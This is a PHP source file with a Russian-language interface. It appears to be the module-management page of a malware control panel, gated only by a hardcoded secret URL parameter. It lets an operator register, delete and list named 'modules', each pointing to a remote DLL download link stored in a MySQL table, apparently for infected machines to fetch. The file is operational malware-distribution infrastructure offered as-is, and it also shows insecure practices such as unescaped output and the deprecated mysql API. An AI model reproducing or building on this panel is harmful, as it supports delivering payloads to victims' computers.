 <meta charset="utf-8">
<?

if($_GET['login']==="jkhjkhhkfmodule")
{
	
 include('system/config.php');
ini_set('display_errors','on');
error_reporting(E_ALL);
/**/
mysql_connect($config['mysql_host'], $config['mysql_user'], $config['mysql_pass']) or die("LOL"); 

mysql_select_db($config['mysql_db']) or die("LOL");

?>
<br>

<form method='post' action=""> 

                              

                                         <font color='#000000' size='15'>Ввод модуля</font><br>

                                         <font color='#000000'><b>Введите название модуля:</b></font>

                                         <input type='text' name='mname' size='38' value='gmodule'>

                                         <br>

                        <font color='#000000'><b>Введите ссылку на модуль:</b></font>

                                         <input type='text' name='mlink' size='38' value='http://google.com/module.dll'>

                                         <br>

                                         <input type=submit size='width:100px' name="ADD" value='Добавить'>   
</form>


<?
  if(isset($_POST['ADD'])){
 
 
    $mlink=mysql_real_escape_string($_POST['mlink']);
 
    $mname=mysql_real_escape_string($_POST['mname']);
 
     $query=mysql_query("INSERT INTO module (mlink,mname) VALUES ('$mlink', '$mname')") or die('222');
 
 
 
    if($query){
      echo '<b><font size="5">Модуль добавлен!</font></b>';
       

 
}
    }
 

  
 ?>
 <hr>




<form method='post' action=""> 
                                         <font color='#000000' size='15'>Удаление модуля</font>

                                         <br><font color='#000000'><b>Введите название модуля:</b></font>

                                         <input type='text' name='ym' size='28' value='gmodule'>

                                         <input type=submit size='width:100px' name="DELETE" value='Удалить'>     

                                         <br>


</form>


<?
 
  if(isset($_POST['DELETE']) and $_POST['ym']!=''){
    $mname=mysql_real_escape_string($_POST['ym']);
    $query=mysql_query("DELETE FROM module where mname='$mname'");
 
    if($query){
      echo '<b><font size="5">Модуль удален</font></b>';
    }
  }
  ?>
<hr>
<?
   $list=mysql_query('SELECT * FROM `module`');

   while($row=mysql_fetch_array($list)){
         echo '<p><b>Название модуля:</b> '.$row['mname'].'   <br>  <b>Ссылка на модуль:</b> '.$row['mlink'].'</p>','<br>';
   }
}
else{echo "<font color='red'><b>Не авторизирован</b></font>", "<BR>","<BR>","<BR>" ;}
 ?>